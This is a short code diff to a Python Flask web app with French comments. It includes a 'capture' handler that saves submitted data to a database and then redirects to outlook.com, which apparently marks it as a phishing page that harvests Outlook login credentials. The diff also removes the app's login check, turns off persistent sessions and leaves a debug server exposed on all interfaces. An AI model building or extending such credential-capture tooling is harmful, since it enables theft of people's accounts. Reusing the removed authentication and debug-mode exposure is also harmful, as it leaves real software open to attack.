@@ -82,7 +82,7 @@ def capture():
         db.session.commit()
     return redirect("https://outlook.com")
 
-@app.route("/")
+@app.route("/home")
 def home():
     return render_template("index.html")
 
@@ -175,13 +175,8 @@ def download_pdf():
 # Gérer la déconnexion et forcer la demande de mot de passe à chaque fois
 @app.before_request
 def before_request():
-    session.permanent = True
+    session.permanent = False  # Désactive les cookies persistants pour la session
     app.permanent_session_lifetime = timedelta(seconds=60)  # Session expirée après 60 secondes d'inactivité
-
-    # Vérifier si l'utilisateur est connecté à chaque accès et redemander le mot de passe si nécessaire
-    if not session.get("logged_in"):
-        if request.endpoint not in ['login', 'home']:
-            return redirect(url_for('login', next=request.url))
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, debug=True)
